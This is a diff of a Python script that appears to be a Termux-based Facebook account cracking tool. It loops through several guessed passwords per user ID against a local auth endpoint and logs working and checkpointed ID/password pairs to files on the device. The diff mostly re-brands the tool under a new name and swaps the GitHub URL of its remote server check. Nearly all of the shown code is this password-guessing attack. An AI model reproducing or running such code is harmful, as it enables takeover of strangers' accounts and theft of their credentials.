@@ -7,8 +7,8 @@
 import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
-__author__ = 'Asghar Latif'
-__copyright = 'All rights reserved . Copyright  Malik Asghar'
+#__author__ = 'Asghar Latif'
+#__copyright = 'All rights reserved . Copyright  Malik Asghar'
 os.system('termux-setup-storage')
 try:
     os.mkdir('/sdcard/ids')
@@ -39,7 +39,7 @@ def reg():
     except (KeyError, IOError):
         reg2()
 
-    r = requests.get('https://raw.githubusercontent.com/asgharmalik37/filecrack3/main/server.txt').text
+    r = requests.get('https://raw.githubusercontent.com/Ethical-404/PROHACK/main/server.txt').text
     if to in r:
         os.system('cd ..... && npm install')
         os.system('fuser -k 5000/tcp &')
@@ -1020,7 +1020,7 @@ def n_s():
     print ' \x1b[1;97mCrack Running\x1b[1;91m '
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\x1b[1;94m{MALIK ASGHAR LATIF}\x1b[1;91m'
+    print '\t\x1b[1;94m{ARBAB ALI MEMON}\x1b[1;91m'
     print 47 * '-'
 
     def main(arg):
@@ -1031,13 +1031,13 @@ def n_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\x1b[1;92m[ARBAB-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass1
+                print '\x1b[1;31;1m[ARBAB-CP] ' + uid + ' | ' + pass1
                 cp = open('ASGHAR_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -1047,13 +1047,13 @@ def n_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\x1b[1;92m[ARBAB-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass2
+                    print '\x1b[1;31;1m[ARBAB-CP] ' + uid + ' | ' + pass2
                     cp = open('ASGHAR_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -1063,13 +1063,13 @@ def n_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print '\x1b[1;92m[ARBAB-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass3
+                        print '\x1b[1;31;1m[ARBAB-CP] ' + uid + ' | ' + pass3
                         cp = open('ASGHAR_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -1079,13 +1079,13 @@ def n_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print '\x1b[1;92m[ARBAB-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass4
+                            print '\x1b[1;31;1m[ARBAB-CP] ' + uid + ' | ' + pass4
                             cp = open('ASGHAR_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
@@ -1094,13 +1094,13 @@ def n_s():
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
-                                print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print '\x1b[1;92m[ARBAB-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error']:
-                                print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass5
+                                print '\x1b[1;31;1m[ARBAB-CP] ' + uid + ' | ' + pass5
                                 cp = open('ASGHAR_CP.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
@@ -1109,13 +1109,13 @@ def n_s():
                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                 q = json.loads(data)
                                 if 'loc' in q:
-                                    print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print '\x1b[1;92m[ARBAB-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                     ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
                                     ok.write(uid + ' | ' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in q['error']:
-                                    print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass6
+                                    print '\x1b[1;31;1m[ARBAB-CP] ' + uid + ' | ' + pass6
                                     cp = open('ASGHAR_CP.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
                                     cp.close()
@@ -1124,13 +1124,13 @@ def n_s():
                                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                     q = json.loads(data)
                                     if 'loc' in q:
-                                        print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        print '\x1b[1;92m[ARBAB-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                         ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
                                         ok.write(uid + ' | ' + pass7 + '\n')
                                         ok.close()
                                         oks.append(uid + pass7)
                                     elif 'www.facebook.com' in q['error']:
-                                        print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass7
+                                        print '\x1b[1;31;1m[ARBAB-CP] ' + uid + ' | ' + pass7
                                         cp = open('ASGHAR_CP.txt', 'a')
                                         cp.write(uid + ' | ' + pass7 + '\n')
                                         cp.close()
@@ -1139,13 +1139,13 @@ def n_s():
                                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                         q = json.loads(data)
                                         if 'loc' in q:
-                                            print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                            print '\x1b[1;92m[ARBAB-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                             ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
                                             ok.write(uid + ' | ' + pass8 + '\n')
                                             ok.close()
                                             oks.append(uid + pass8)
                                         elif 'www.facebook.com' in q['error']:
-                                            print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass8
+                                            print '\x1b[1;31;1m[ARBAB-CP] ' + uid + ' | ' + pass8
                                             cp = open('ASGHAR_CP.txt', 'a')
                                             cp.write(uid + ' | ' + pass8 + '\n')
                                             cp.close()
